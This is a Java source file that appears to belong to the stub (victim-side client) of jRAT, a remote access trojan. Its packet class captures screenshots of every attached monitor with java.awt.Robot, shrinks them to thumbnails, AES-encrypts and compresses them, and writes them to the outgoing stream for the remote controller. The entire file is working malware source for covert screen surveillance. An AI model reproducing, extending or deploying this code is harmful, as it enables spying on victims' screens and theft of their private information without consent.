package io.jrat.stub.packets.outgoing;

import io.jrat.common.compress.GZip;
import io.jrat.common.crypto.Crypto;
import io.jrat.common.io.StringWriter;
import io.jrat.stub.Main;
import io.jrat.stub.utils.ImageUtils;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

public class Packet71AllThumbnails extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		try {
			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
			
			dos.writeInt(devices.length);
			
			for (int i = 0; i < devices.length; i++) {
				GraphicsDevice screen = devices[i];
				Robot robot = new Robot(screen);
				Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
				screenBounds.x = 0;
				screenBounds.y = 0;
				
				BufferedImage image = robot.createScreenCapture(screenBounds);
				ImageUtils.resize(image, 150, 100);
				
				byte[] buffer = GZip.compress(Crypto.encrypt(ImageUtils.encode(image), Main.aesKey));
				
				dos.writeInt(buffer.length);
				dos.write(buffer);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public byte getPacketId() {
		return 71;
	}

}